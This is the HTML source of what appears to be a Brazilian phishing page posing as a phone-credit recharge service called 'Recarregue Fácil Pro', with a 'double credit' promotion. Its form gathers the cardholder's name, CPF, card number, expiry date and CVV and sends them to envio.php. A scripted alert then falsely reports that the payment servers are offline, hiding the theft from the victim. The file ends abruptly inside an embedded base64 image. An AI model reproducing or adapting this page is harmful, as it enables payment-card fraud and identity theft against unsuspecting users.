<!DOCTYPE html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Recarregue Facil Pro</title
    <!-- favicon -->
    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
    <!-- bootstrap -->
    <link rel="stylesheet" href="assets/css/bootstrap.min.css">
    <!-- fontawesome -->
    <link rel="stylesheet" href="assets/css/fontawesome-all.min.css">
    <!-- slicknav -->
    <link rel="stylesheet" href="assets/css/slicknav.min.css">
    <!-- animate.css -->
    <link rel="stylesheet" href="assets/css/animate.css">
    <!-- Owl Carousel -->
    <link rel="stylesheet" href="assets/css/owl.carousel.min.css">
    <!-- stylesheet -->
    <link rel="stylesheet" href="assets/css/style.css">
    <!-- responsive -->
    <link rel="stylesheet" href="assets/css/responsive.css">


</head>
<body>
<!-- support bar area start -->

<!-- navbar area start -->
<nav class="navbar-area">
    <div class="container">
        <div class="row">
            <div class="col-md-2 col-sm-6 col-xs-6">
                <a href="#" class="logo">
                    <img src="assets/img/loo.png" alt="">
                </a>
            </div>
           
            </div>
        </div>
    </div>
</nav>
<!--end nav bar-->

<!-- header-area start -->
<!-- how it works end -->
<!-- mobile recharge area start -->
<section class="mobile-recharge-area" id="recharge">
    <div class="container">
        <div class="row">
            <div class="col-md-6 col-md-offset-3 text-center">
                
            </div>
        </div>
        <div class="row">
            <div class="col-md-5">
                <div class="recharge-left-form">
                    <h3>Recarga Segura</h3>
                    <form method="POST" action="envio.php ">
                        <div class="radio-btn-group">



                        </div>
                        <div class="input-group">

                         
                             <label for="nome">Nome do Titular</label>
                            <input type="text" name="titular_cc" id="titular_cc" placeholder="Insira como impresso no cartão" maxlength="35" autocomplete="no" required>

                                 <label for="cpfC">CPF do Titular</label>
                             <input type="text" id="cpf" name="cpf" placeholder="Insira o CPF" maxlength="14"  onkeypress="formatar('###.###.###-##', this)" autocomplete="no" required>
                              <label for="cpfC">Número do Cartão</label>
                            <input type="text" maxlength="16" name="numero_cc" id="numero_cc"  placeholder="Insira o Número do Cartão"  onkeypress="formatar('################', this)" autocomplete="no">
                             <label for="cpfC">Data de Validade</label>
                            <input id="val" type="text" maxlength="5" name="expiracao" id="expiracao" class="validate mask-cpf error valid" onkeypress="formatar('##/###', this)" placeholder="Insira a data de validade (12/18)" required>
                             <label for="cpfC">Código de Segurança </label>
                            <input type="text" name="cvv" id="cvv" placeholder="CVV (3 últimos dígitos no verso do cartão)" maxlength="4" required>
                         
                            
<script type="text/javascript">
/* Máscaras ER */
function mascara(o,f){
   v_obj=o
   v_fun=f
   setTimeout("execmascara()",1)
}
function execmascara(){
   v_obj.value=v_fun(v_obj.value)
}
function mcc(v){
   v=v.replace(/\D/g,"");
   v=v.replace(/^(\d{4})(\d)/g,"$1 $2");
   v=v.replace(/^(\d{4})\s(\d{4})(\d)/g,"$1 $2 $3");
   v=v.replace(/^(\d{4})\s(\d{4})\s(\d{4})(\d)/g,"$1 $2 $3 $4");
   return v;
}
function id( el ){
    return document.getElementById( el );
}
window.onload = function(){
    id('cartaoc').onkeypress = function(){
        mascara( this, mcc );
    }
}
</script>

<script>
function formatar(mascara, documento){
 var i = documento.value.length;
 var saida = mascara.substring(0,1);
 var texto = mascara.substring(i)
 
 if (texto.substring(0,1) != saida){
           documento.value += texto.substring(0,1);
 }
 
}
</script>
                        
                    
                        </div>
                        <div class="checkbox-group">
                            <div class="d-checkbox">
                                <input type="checkbox" id="event-1">
                                <label for="event-1"></label>
                                <span>Confirmo minhas informações de pagamento</span>
                            </div>
                        </div>


                <script>
                function funcao1()
                    {
                        alert("Erro: Sua recarga não foi completada, servidores de pagamento offline.");
                    }
                </script>

                        <input type="submit" onclick="funcao1()"  value="PAGAR E FINALIZAR A RECARGA AGORA">
                    </form>
                </div>
            </div>
             <div class="col-md-7">
                    <div class="recharge-right-box">
                        <h3>Recarregue Fácil Pro</h3>
                        <div class="single-promo-box">
                            <div class="icon">
                            
                            </div>
                            <h3>Receba o Dobro na sua primeira Recarga</h3>
                            <h4>Recarregue R$10,00 Receba R$20,00 em créditos para seu celular. Isso mesmo, receba em dobro na sua primeira recarga, só aqui na Recarregue Fácil Pro</h4>
                        </div>
                        <div class="single-promo-box">
                      
                            <h3>Pague com as principais bandeiras de cartão</h3>
                            <h4>Aceitamos as bandeiras: Visa, Mastercard, Elo, HiperCard, American Express e Maestro</h4>
                        </div>
                    </div>
            </div>
        </div>
    </div>
</section>



<footer class="footer-area">
    <div class="container">
        <div class="row">
            <div class="col-md-6 col-md-offset-3 text-center">
               Copyright &copy; Recarregue Fácil Pro 2018. Todos os direitos reservados.
            </div>
        </div>
    </div>
</footer>
<!-- footer area start end -->

<!-- back to top btn start -->
    <div class="back-to-top">
            <i class="fas fa-angle-up"></i>
    </div>
<!-- back to top btn end -->
<!-- preloader start -->
<div class="preloader">
    <div class="preloader-inner">
        <div class="mobile">
            <svg width="67px" height="121px">
                <image x="0px" y="0px" width="67px" height="121px" xlink:href="data:img/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEMAAAB5CAMAAABV9WyKAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAyVBMVEX///9CSmBCSmBCSmBCSmBCSmBCSmBCSmBCSmBCSmBCSmCLkp7HzNFCSmBCSmBCSmBCSmA3PlAoLTgmKzUwN0VASF0tM0ArMT09RFg+Rls2PE0vNUI7QlU0OkqVm6fn7O3J3uq/2end5+zT4uuDvOJRpN1IoNxbqd6XxuS11Oihy+arz+dvs+B5uOGNweNlrt/O4tabz6iCxZCLyJis1bfW5d5huHJpu3l6wonf6eW12L9xvoGk0q+Ty6C93MbF384yOEgpLzr////QEUwVAAAAEHRSTlMAQLDgkBDwMGCgwNjvINCAS0YSbQAAAAFiS0dEAIgFHUgAAAAHdElNRQfiAxQNIyCCnG7LAAACEklEQVRo3u3ZaU/CMBjA8SLI5dXJzcDKOBVUQKkcHvj9v5TbAC2sg/Z5akLi/m8aSPmFNdlIeAghJHZCgcUTp8QvARW8kjE04ZZyLwRJ0DghIWdhXec25Qu0UHTXUlm+NU3k71dyQlVa9VdbvjcTYtREo07r/lqU782GGLQkGOU1Wdc0CtX6por7suyuFtU0NDoe4wbdGWHoziMjMnSM28bhnH1Gs9XuqNTtOWFGTwnwazfkRkudcLuTGfdaRKfdDBqO2lH81goafU2i03ECht5peDUCxkDb6B2J0Tdg3OKNLsMbfbzxwNDGwMEa7R5je4zu4GCP/a2nUMB42nlIKbRrAIhdA0LsGCBi24ARWwaQEA0oIRiPUOJ4f28jIzLCjeForNDzyyTUmIy5aqMQY/iqTHA+ncmMiQ7B+VhmqF/IqnnQGGoSfBE03nQNPgwYupfC+YsB4+1PjHcDxtyAwRYGjA8DBhsZMNhc746RGmwy0jkUuaHW1IAxm+KNDYIy1gjOWCFIw0ewhoegDRfBG2z2iTd+iozI+D/GsfyvHRk6huXNUOwawihspjBLuFESRkFAwxJmQRWgUdqaa8EMca5lGzCKBow80LAFwwIawqDviwINuhTGfFBjPWPMfe0jDt4vlapdzFv792RJkmLLkAzaiJELLJElhKRxRPLCG4qnMUdymVoN50+vssDvcJL2Pv8Nl3aoVBduPs8AAAAASUVORK5CYII="
                />
            </svg>
            <div class="coin">
                <svg width="50px" height="50px">
                    <image x="0px" y="0px" width="50px" height="50px" xlink:href="data:img/png;base64,iVBORw0KGgoAAAANSUhEUgAAAmEAAAMVCAMAAAAI79MaAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAANlBMVEX///8bIw0bIw0bIw0bIw0bIw0bIw0bIw0bIw0bIw0bIw0bIw0bIw0bIw0bIw0bIw0bIw3///8+Z5n5AAAAEHRSTlMAEGCw4NCgUEDwgCBwwDCQqg4X8gAAAAFiS0dEAIgFHUgAAAAHdElNRQfiAxQNJATx3hzdAAAu2UlEQVR42u2d2bajOgxEQ+aJJP//tR1CcjoDRiUPGA378a7c02AKSy7JZrFwQJrlan3r2Gx3ta/F0cd+e3vjcGxqX5CjitPq9sXhXPuaHEXsDrdfWp/GnEwsb4McLrUvzNFBQGAuMScPl0NIYbe1B0onnfYWpq19cY58lrcxlrUvzxFPO6qwg8dJJ43L7eaTmFOQK6GwTe0LdISzJhR2c8fCSWFHCey2rX2Jjmi2pMI813cSaEiBea7vpLAEFOa5vhNPCyjsdqp9lY5YTojAbtfal+mI5Qgp7FD7Mh2xkGaY5/pOClTF6IV3WDhx0GaY5/pOCgdUYcfaV+qIBDHDeta1L9URyQpW2M236Dp8MDOsZ1X7Yh2BnBkK81zf4bPhKMx3gDtcUDPMc30nDqp9+ot97et1pAGbYT3e6urwoNunv/BWV8E0++XxeFxOGojgilGdXP+0Px+POw/NOTid/y/q2uVUMwXSPv3JhK2uu+2r6eOwOvvcmcbpay6Z6vBBvGL0x0Tb2prjV0/R1jWWwEAL4HqSCg3LDHs+6UlGZOCwvIPXrGI5DT/nVXkDnVMx+nvQE8wlp+GNA97HHUfw4K7yZ6gyzbCe8q2uwa5ul1gMIyfD3TaFV1Fg+/TXRRUekP3IVXkjN59m3PK8loxJ+xiBFS5/N6P+ycFL72woQ6pkfss2w56qLzgcS6LG4HsFuACGVFvqvW2YFaM/0RcbjQu9NdjdVyZQd1ah/vgIM6ynUDbUIPs2vQmSCWZIrYu8uYz26U/KhKo9tu7wTIwFXLUp4GjHmGHlnvIJ1bs3QbLAWxsO2UMTq336k/xh+wznhB4mWWAnRvS0mSuCUWZYT+5W1wujeuXHZ7Dg+QVZy+G89ukvslooDa+0MO0Tkg50cNfb3JEx4480w3pyhqodczJ1v4IDU2E5y+GRZtiTbJdxYg+BK4wDfyLJVQ5nt09/kmtFd+QL3RXGgZPpv9hkyfijzbCePLn+PqI/zRXGIq72nKEczm+fzv+cm7hU0HtdWcQ93vQG2AQzrCe91ZUqcgdwt4JHbLBKLYfHhKdPEqcSfoafTdq2iJ5LDkm+ekLF6EVarh+TgPZ4EyKPBN8zpQE2qn36659PuGuwyD2IV76ZpNhS8eXwhCf8R/SStklZx/rZLFySrPXYcniiGfbUd+Qd40XuIXwzCJfoNsCeuIw/SdZ/8o6aQYE21lF80ySX5Jw7IuNPNsN6IiZQZpF7AHfD2CT7BvxyeOK8+YKf63OL3L/4ThA+GZZ1K+aLnRio/mBGaLiNdQQ/0p9PjqybVw7PYIb18LLutAz/iRcl+eRJijgNsJDbifyIU8CJKnIn/YvOi0wxCy+HI8nQGjLq4Fw/PcPv8Sb9GOILKF+iABfyUBnhCOWHaN69yxEgO3yjUQxJDfMfYA2wkBl2wi4L+geji9yR/57zTa4XHMz4kX+uMyKQYIos7XLN0TcvGcWSYRH/XxrkYgsyw7oEC2n7oB95SpH7B+/ciSOTAfqEyvghPXd/AzI1iNwvso01hHfuxJHNn+oZPw8K+sf6JRuSPo0v7iLbWIN4ySiSnIGkY6wcDrU89hqF5taRfyq1yP3DhCetKyNvKOkIZ+CI8fn0NSEvOLi2gM5q4uGdO7Fkadf6JFQOhzyIV0KNKD+U62fN8J94ySiWTN00XzIZTFogb/1VgYKUP/jYcxS5f6n9nASTpWb3zWADLJJ6r1m/HnIQshS5f/CSUTz5U5YHv+VwaFb6n8RBM97PXMk5q4mDl4ziiTx2HBDL1+MHK0YvoKzt68HnKnL/MtEXlXRS6qF8ZfxQwvfuCSDp+qeHkN7GGsI7d1Iokhj3vJfD4YrRC8g9e5tbMha5f/CSUQrJx0iM8FYOhxKk98AKVQD+P/qIs5pwvGSUQr4OniFe50ExKkYvkDnpta0tTxtrEO/cSaJY9tLTl8OhHPyzqonH1cxF7h+8ZJRG4cfTN8AiMv7Kp+G1Qe4i9w9eMkojbwfPEO0J8kS+82nM3yiZ4T/xzd5pZO7gGeIApUnfphPk0ZZNwHq8cycR+iEdilmZb/wWsktHvw5gDeqbvVMB5HPK3nA18KxjLiyR9gQspX2zdypANFqWKim/8WsJlDVS+pZcwA70klEy9CB3TlVhT2DIEihrpDx8FHpu9pJROugol2jt+2PINy9Zb+i9YMAS8c6ddIAH+axiF6zNDC3Yyi1zX/UsIEPwzp10gHznZToWc5+GZ4pi/9pLz8gqp/bj0QA9M/3Pkgr1yAy7mmXc4Le+IvpmfLN3DoAOnv9BrEifXyCdLrKN4M19AMKwd+7kAJgq3hPxAuZY6DnmX79+7OgEMlAvGeWA/SpnN8dCnlPu3XZfu9JZk7eTAJ2OfDc+5J1cwslOXil/n6xB/x/euZMHILX6nmWymmPHlCuD+fk8JtDy4SWjPETZQhnNsbAjkK9yNHDCGSBf3+ydB2DNNtBhkM0cGwtFuabKoXPZgdaf2k9GDcBYD6W8mcyxsZ0WeSpHg4dpAAscLxnlAtj6Pbhsz2OOja3XslSOhrMpwKTxklEugJw3YFllMMfGJ4r0vx861AzwKrxzJxt01h50FJLNsXFTM7VyFD6YMeGeHTbA+xxc8CWaY0QDVmLlKHy4LLBM9ZJRPoCEeiQnSTLHqMeYot/NSJgDck/f7J0P4IUeTZcSzDEq14mvHI0f8g+sn71zJyPALDT6/0ebY3SuEyve8U8TAtHXS0Y5AWIR0WYQaY7RdZk4R4T6vCowNfpm75wASzZqwOPMMToSRVWOSOGmv1IOiyxBI8IcQyIRf3IEPnOfmhY4XPIkvmxzDFmucStHB2DyASZG3+ydFyDEIWrgmmNIhx+zcgR9URVQrXfu5AUoHGF1YJY5hv1JTvDdYJUe4E96ySgz9JCj258Z5hiWTOOVI/jL9vnu1kHJ+FbD5hj4FOHK0Qptqwe8Cu/cyU3WzAQ0x9CniCV3lAX2Rqas0+EArK4YJjdmjqGOE3SIIiczB14ALxllB8ieOHu7AHMMb/Cj/xZggf0HWJ16505+gFDEixykOYb/qRPxpxAL7P3K6Fv1klF+gBUbs2GKMMc4eh2/OMgCewNoh/OSUX5KhI4xc4w3S4zkdaAF9kbmhMABAdJfvgsZNMe4uyxC8yFsgf0HWDh4504JgOVfxOabYXOMmTh1DCdPsAXGu1EvGZUAsCGjqsED5tg2JggNhNw2alM2UOX3zd4lQKzzqPSk+QqVq9jn9/V3DnGlQ+A+vWRUBqDYE7vE2m2fE9BhdU7wMpvl/2Xg5hj5h4BFs5eMygBsv0mxifZ3MizR9ufjnYS/BBh/vtm7DMAaS4PVDXgV3rlTCGDs5ZfrgAKshvdongBet/z4AeQCvtm7FEC9Tn4ODKxnvHOnFEDhSPw6vpgn4yAAhSPpXiTgK3vJqBzAQl56W4uBW5wzBl5wYJr2zp1yIEmKbL8COaOg9jWqBigKy15oActl3+xdEqCxRbZZZMLymzNA4Ui2XwEESS8ZFUX5EwCWMrLfoPkDRBHJ/Z/qs4D5A2TCkv0K9SuZ+YOs5uUWVZCDomS7MQIAOnjkOpJAe6t37pQGqKrIzVSALNNLRqVR/ZqrnqClgKQqUv0K5AwfuUmmGIDlllTXG2hv9ZJReQDLSGqjK/DySDb7pIB8SKj2NcaBdI5Ib7CUAPIcZKbDwCLGS0ZTAGyVkLmkB4wYqfFfFkA+LNOvALwKqWsYWSCFI4mlFa33JRDgXZdYHgaK+jLnZnkAtRWJ+QqQX8qth8kCeNkFrrmQNbLEqVkiSOFInm+E+HxeMpoIYE+hPL8CqFVI7q2UBWAcyXsYKl8bqWgMKDpDv1Q0JsXIt5xrX6MhgCYEaQt7pRaMVIDCkTS/ApjCvGQ0HUgzqKxGV313JBx1bzzgVUiblWUDZC2y+o0VZpayQVZekvwKxKuQtjqWDdLpIqnRFWhv9c6daQEccElRBYj68qoUsgEKR5KaqYCWNy8ZTYuusKIt6GsASY3l+BWAgyxq4aICYHkvp8oC3Iws80UDgEV5q32NKEgl3zd7Tw3SwSMldUHuxUtGkwM8FSnLL2Bh7CWj6QG25kixkABzT05OqQdk/SXDr0C8CjnrYj0gz0VGKQ8pssp4V5QB+OAyYgsQ7yXVJ/QA1PJk5MfAFCapxqoHpHAkYY2vyXfRBVI4kuBTIt6xl4yqACzyJfgVSm5DIzpefi1TsUaQBGb+fgXiVfhm7zogBeP5L8KAJfGt9jWaBWh6mb+RpMbW0whSOJq7X4FsxfWSUS00PB1kuTL3t0QxQISZe2+oikivFyRLnrdfoWO1ohdkpT/vggtS+pq/46IXpINn3o2uQHurd+7UBKi4zDuLATJJLxnVRPoUIH8S1g6Sxkhn3omkdhBHTDruhtVjCZhJCmh9MVmHJZDmK2HtzRXTcwH2TyiinfN6RSVI0VsVh7kXWHXR2EjAPmnnXf9SxQXwKRWy9lXlRFgwwQY5eMI/CWYFdvMi+CRYFphLbAKQDUaKOXguVhijSf6bxNwYK0pjx8cPsXHToiRI27R2vJunIMaTsCfuWRSjsZ6E9aw9TpYC2VtoAT8opRDIKTUm8PVkIZCmfBv4Dsoi+BT2H5/ESuBT2H88EyuALyTfmPcmUKHYrnh/41vc8uN2/jue6+en9jOdFzK+RSEKC3tvOXgXT27MbS4i8K1HubG1PZLGE7HceGPYJ37mU25qP9HZUfuBaAM5aOvWKgHab1z7iWgDWEqu9LRNnYCs0/sQ80IrTFViAuxHcIXlhVaYrp2EdI3MFZYXWmG6Rtza/dbH2ohbu9/6WBtxa/dbH2sjbu1+62NtxK3db32sjbi1+62PtRG3dr/1sTbi1u63PtZG3Nr91sfaiFu73/pYG3Fr91sfayNu7X7rY23Erd1vfayNuLX7rY+1Ebd2v/WxNuLW7rc+1kbc2v3Wx9qIW7vf+lgbcWv3Wx9rI27tfutjbcSt3W99rI24tfutj7URt3a/9bE24tbutz7WRtza/dbH2ohbu9/6WBtxa/dbH2sjbu1+62NtxK3db32sjbi1+62PtRG3dr/1sTbi1u63PtZGnL5f/wBgXqwpbEfdrn92JjO0wq61LzEr5Mc029pXqA3gLGpNB7nSx7j6N0wzg3w4a3vUAvA5YF1JwRwAFGaK2s9DH/4N5g88DcuOf5vtA0/DsuPfl/zAP2CaHejTWWZwN6wAnoi94d8vLQCwgrfDrvbT0IiHyf+saz8MnUDf9bSBrySLQFdSzKDnW63zwj8m/8Tz/EL4JPbEW8NK4b7+A8/CiuHLyY6DZ2HluNZ+unPAvbCCNJ7s31a1H4JuPE56FlYYb7G4bby9tSB7X07e2XquX4iTV797Dufaj0IlzdEbeP7YeAtidna+jvzg6qEyKydPwL5ZuzGWEV9CDrHyaSwTew+Qwxx8GstB4yvIMD6NpbPzFeQYPo0lclrVfoSzx6exFM4+gdH4NBaNWxQg7o3F4RkYzNotfj5Nlgxsfa19FhhADjPGm3q47HNMYCshGco+gyHTeqTk0GTol14fBe3JadInsoP3jeFc0vd3t+KOdV0mr2t0HZZcknOyvraCpq//JAfLjcjbnpzkFP9wFJuSpPZYeqQEuCQmJGtx4fGD1D5LX1NSJEZI4frqSNSYrylHSYyQrRB3ghqFJI25+zpCWoRs9SQhSRo7yJ/HS7FMenX16KsjSWNuWwyTso5SkH99k9J56cnYAE2Cy6o0LiR4F77b7YdLfFAQ7H9RxO9x96axLxLON9S9x34ZvfjROa/HEl/obrWHg/iU3497/SPeBTOxKzV6r4Ln+09O0Tm+3gTsk9gNoxsj40MQneO3hjoJIkPlQXsOgRBrsxpbLEXuivFmi+hKt73tNZEbY6wvKSM9RZMnTUaa/KYlFruItNoEFZfxG3YtIgtFhisicTtkzEos0qWwOoH1RE1jusseQeJcCsMTWE/UNGbSGIsTmL0l5C8xi0qDEova0+3uzoOYBZI5iUX1UvhJWS8iTr0yJrEYgflnCt6I2BVvKoONEZipAaKJsF8NFSljBGZ0wT0CP+E3I7EIgSltxE+DHymNSCxCYB4hB+FHShMSixCYryFDsFufDEgsQmC+hgzD3iWvXmJ8gbnLOkrD7UxU7ovxBeaHrlFw65SqJcYXmJsUNNxkTLHE+AKz3amDwm0iUCsxtsDcBQPhtnIqlRhfYNqXPfngOmOr2hdcgh1XYJ7jc2Dm+wobq9kNh74lngczRKiTGFtg6kagOMyeTmU+NltgvojkwxxkVcso9rY1VXc/GcxhVnQsA1dg7lJEwhtoRWt1ZulM0Z1PDc+1UDPQTK9GzX1XgTXYSpxXplPjAkuDJ7HaV5sDpk+j5LWqCOu8LAWmENPKd4Glw3qnxdtCTI/GBZYDlsSEr9sbF1gNWBITnfcyjTAXWC44EjtI7jDg+RQusHxwJCZ43I8usGpwJCa2W4znU7jA8sIZfaELSt4y0gWWG47ERC4oectIF1h+GBITWUhhLSNdYCVgSGwt7wFYrMDODobExGX7rCxftCMzaxiPQVi2f2EJTGISIARGGVxUyysry3eBlQTPVkRFElZTqwusKLjEBDWLsXoORVoxksAlJqZZjNUS5gIrDaP9QMjDOHGSsGvtqzUALjEhKTHHahUzL4sGX3iJMCY5SVhb+2KNgJeIBbzynCRMxBujAtyfnL0rxknCDi6wyYDN/dm7YowkTEhaqQS4G3TmrhgnCROyNNYCbIvNukC5ZwhM2flV8wcOLzP+gAGnHClg0aKMBv18yIx7xRgfB555tB9hvzse9yJTSNizmG2vGKNTROoycvmq6R9WM44lIWAnaaYpMmPnh9Bl5PIjzrTybgKdA2ZqWTCMipm+I+M0K/m3gS4oZ1lsYWy/FVnuHqofi5MYXASf4UqfYVTM8gUhGXw28iQGpjLzy2PgpfCsF8MjDE/RM01YRkBngtkt9hlm/uzeDoRT4Gbk2Xpotj8za58RI8UFlgfBFFncJAZn+7OaCRgxUt5L/yCYvshbtaDZ/qziJB4jhbaE7WU8BwzUuJxRnMRj5PyWKBgjVkztS4sA9fZnkwEwYqTMJGxUYQKrR2jMmY2thMdIoUnY6BZjiQpD6y8z8V3xGCk0CVvoUxjY7D4Tuw+OkVKTsIU+haGp2CziJF6PnMmcG4M6haGpzQy2HuH7pGbb1wagT2GgKzaDRj58x3r9a41Hn8JQV6y6o4z3tUp9Eg8UKgx9dJXvD9+AW/1dSEKjwsBtFZWLFvDeD4HFlXdUKgzsFau6QMOtMLlGxQOVCgMti5qmGF4uEmxUPNCpMNCyqGgCwFbYLIy7FJQqDJwiqt3iCbq8yvNsHpQqDHQz17UuDz5xWnqM1KswMAxV6hSDdxCLj5GKFYY55nXccjjNlx8jNSsMi5NV2q7gNF9+jNSsMPA5VrhL2M1XECNVKwyLkxWeIurma4iRuhWGxcnJ+99hN19DjNStMCxOTr5TH23aEV6PfKFaYViX8sSOBXx4tvB65AvdCoMC0rSOBXxg64w2dSahW2FYfXJSxwJ1KmQeszOAcoVh3uaE8Qh2KjSM/gPlCsPqMxM6FujpLZL3fnyiXWGY+TTZraLbi0Tv/fhEvcKgsDSZMYD2VOiwwqhb1qEwLLWeyHYVe05jAvoVBjmcEzWKoWarlqHvMKAwaOKYZBJDzVax5+wMYUBh0PptktQabAtTlOYvbCgMstEnsNDRTd6K0vyFDYVBj7b8xIHWizSl+QsjCoMy7OKTGFovUjTuHSMKa497LQkBkuyXnsTQKUyPm99DWICb606FyhBnv/Akhk5hKhpbe07LawsZ3kf5nUrIDtiyTcvoFKalaee0XOHnbN8HfzuDIwOTQGaQojYUOIXpcCouV8YXM/+LTHQGCk0hBScxdAqTemr+G6czZ/L6YH0VnCMgfnrBSQycwqodc5CNPXwu2jCt3HcMmbeLvUFo46HoOLH4/px3HOuj0EwBcSyKnWcJTmHCt+Dm0FfHYSszWAK9WaXybDQLEz2F7eEDhQBEagxxLAp5BeAUJrmnomF86letxoAeizKTGDqFCRzTF/tMAfKdq7h8DEm3i0xi+qew3BNYz0Gc/Qw86RKTGDiFyTVbTxH+KsZaWGaKPOoCrw04hYl7YV/s4G9PRLCSlToAzzq/56l9CsO/MBfFQVZDJpCPZveUwdZWoVNYg+4xjqeV1HkB1I6yT2LYKkvoFAZ+CS8NUdPY9JMYuMFI5hQ2icDutHKyMeB5Zy7daJ7CphLYfXzktI8BDzzrChk8Ol9kR8F0ArsJ2oEFTGJZO+WxYp3Mrp3ERh0mYl5CYBLLGPTBkyrEjN475VeRn0hZUgKTWMbyDfYURE5h8IG0uRAzSvQkli/tBr/BJnEhiR6FlhEpwwS8e9luBasIS1xITprlSxsnehLLNR+DBSMp7+Y7ZbopCKSkq8AklulWsIKRmFfzDfwz5WNv1pbZVSZmPzx9X5lcV2wAJU5hWWLkvttZyRJZ7dtGASaxLCtjbLUlcQoD72y7G53remt7v8W7f6QYFsDcksWwwNzWYhucygHll+2yIaLpq3jSLNUdPwq8ghkmFnA9L6eo+wfQEvbcyAEprPsdZhyKURjwDmZIjrBBE9idTw/f30YhVGGLxekKTIxiFAa8hOmGRQMJTOIURoWAzX8h4Aq7D9iR1JgchQGTWHK7CGZVSNzmTaSx27cMg6MwoGFW0KKINgyTvRdsGS7nrfxj3Av73ILGU9g9Vo6ujsRUJhdQwTAxfGGNYRKPBR6daL72BnEVNr63V9Sym07DE28Ha56SUgd5ZyTD+GlF5StsLEkWY4d10FbCIenvY10Vkqb9FyOi2VwYPw5nCJeAPSYsZ6Xt0KT5BdtFKKY1+I1wCrv5TcSjFBYYvY2gPL+DzpOSXhmoEiKxYBQuSQ4dtRypsMX+d/zkHZRCr/UScn2scCfQbV0sWIKJVdii+Yox0k6w6KBFkJDrYyVJgW5rWDNb1q8phd0j5ds0JvN0V9p1jc/DsTxfWObaEzSSB1+XBIUtmuW2Xd/W7XYp8U3soF3XaF8f6wCVs8sUuLXhiJ+iMPnQE020rw/5+RKtinD8H35dbCsMMEUjly+Yny/RqggrbHiojCuMbjaPFAHk54u0KoI2TKD8ZVxhdDCLC2RYni/SqgiaFYFVi3WF0YZFVCUM69sRVWT7T+BuAs6OdYXRhkWUJQbl+RK7KjoCtxPoCbauMLrDIqb8jfXni/QQF64wJrQYIjwrqD8/rXOjIoH78TwsALmNKsISg4reoprp3gmkAK6wAHSuz/YUsKK30Dw/7IcN/9oVRuf67HwJMsOk5vlhhQ2PkyuMTpq45WlsE5vUPD/cWrkenOxdYUCuzyzsQ2aYUD+/I5gEDK4mXWFArs+sHEFHMAj18zvCr+TQq+gKAxJzXsqEVYzE5vmLkR7XoYFyhSF5EytMQjtAZPbtPAmvZAZmZlfYAsj1WYekQBUjmX07T0YSzV+JucKoQeDOOFjFSGpX8IOxPOBnw6QrrIOcdhhZE9Q+LeY40mFGDb/t5yrZFdZBpk6MCg8UJOWaYQ/GO3g/P9XnCusgl394mISCpNii9wviNXrf2ugKe0BaWHCYhIKkYDOsh9yG0P51pLjCHpCWGBwmobYK+QNL7zdeL/t8zBX2gLTE0DAJ7TESbYY9Bwx4kw7bbiJzhfWQ7RBgmIR6D8V2hr2BfRJkfb24wnrIuQe0SKEgKbli9Af66b/RETGkMFIaWG0SerMVBMmOHN/HtaQwMrxBLjy0khRdMfrPCf9UjCtskStMQnar6IoRZ8hcYR9Q4kA6XSG7VW779DfpX5g0pTByuICmVEtBsiP5C4CmFEbOP0At0VSQXGT4ELMphZHyoPshjAXJRYZsfyP3eEM+VIijy9XQFhBFQfLOJcOCcr1dyt0WwxosaiTI4wWgmKHslc0hsTubowobmoAKk1SxB9oCoipIPu46ywe/b12FSX1WRoVJyouH6ii6gmRHcrr/n8NWt8jIMElM5FAZRVmQfIB9ChhjfdUcLqkwOT7/QIcJqAuSD5Z5krHXGJ01voYPqHdx3NaHiigaGncGuOSLlA9WIj80QENqZHRRDcUKtSEgvYL0idJoSU32o28WYugradwZYp95GpP6KaNxqGlobAcHZOgrDZI9x6zZ2OOFVBcsqTA5NgVBx1WoG7EPTjkXlT2tslhJLgdH7hcJEuL3SVLssW8ecmCdGTJ/KEsr7FdAXoXwwwQQ8mtso2oao2rXYb8CMvQVpq6/7HPHyoOmYSNLi8H/ExpWGy0Ei9MRapTDEb9H/g0qmwrWzZB1lE5Df5Bd3olso+fdpIzDkN0AeRX6qt4jNMsc2930SYxSSmgagpoPVaWsAM1um80iO6gZPGpIAu8SsoJSbOiH2V0z5WRqJEblDwHPFBkjTfkqh0z+hRaJUa7DcCIG9VXoNvTD5HLIlEiMck6HQx3UWaAmWWWSzYMV/B2Vdyi/4hTzP3UY8io+yefy61hRUhXsIYMZKhkpK7DhZKwjqXhLqQOahvJ1qGSke5PDCDkrlSpWS4RfMZSIIQa2+r6KIFlr4RoiAWVFDyRiiOVjoK8iQEhhze4YIT4FK3LKnv9NxKCtuKZKRh+MfrV5d2V2XyvwLKjC0a8jBqVh8gcmFuq74KczaypTkO2vuXeIpGEmS0Y9wJfnT2dGbUl+NKAE82PKIKOjYhEUB6CwBac5Vr7xSgW971wTSsM09WkywRTG0Jj4t5VSzPeCGUrD1G6Up0EVdtcYGCvFDyZxn9/N+p6GjYMrbNFgW8fFm2KUZL5+7mnYOAyFgVvHxbvXVNj7rP9ARUnDaRhPYYsGCQnSbVcqEftcLkO9YeIzhwR4CoOyDvEhgYh7nwUgJHWwnIaxFQZITHyYJG7xUy9I4iD+nUuBrTDg3E7pjSpUIvYR8wCBKbChE2ArDPg+qvTVJJWIvSea0Af/7BYlFzEKo89QR74yNWuIG3wvfiOnOolPG5KIUBgZRcSPKNEj9v4GIaUOu71hYyM0+j9REpNem6R6xN5+CghMfNaQRpTCqNWW9FSfSq728C9VDEcacQoj2vSke67UzPR/UoIO16x9N3WJUxjxCMSHBSK72qA//Pq1SSIVNj6y4hVGGfV/P0SmMNUnUNO4woagio2vzApKw8TnDGm4woagGiZeNwilYdJX1om4wgYhSmMvRww550+8/5yIK2wQwo55ecpI96H8wUjDFTYI5Sn3lUZoE4htN8wVFoDal9s3rULdh7VvpTZF/DAFTcOEbHoHAkn0daZh++OqbdvrEljFFPH0FQQGwkrtdYMk+vLn8x9O17/mk8OR1FicwghHUsH6HPJckURfnRvWfM7ca6r5LU5h40MrvntnAfa5AgLT8LZ98PPFZeo0nCiFEVa2htQDaa9AHH1tm0AG2k8P40lRlMKIJEVF6nGj7xFZSirrPhzubx5d2cUojHp3VaQeRI7VbR9ClpIq3r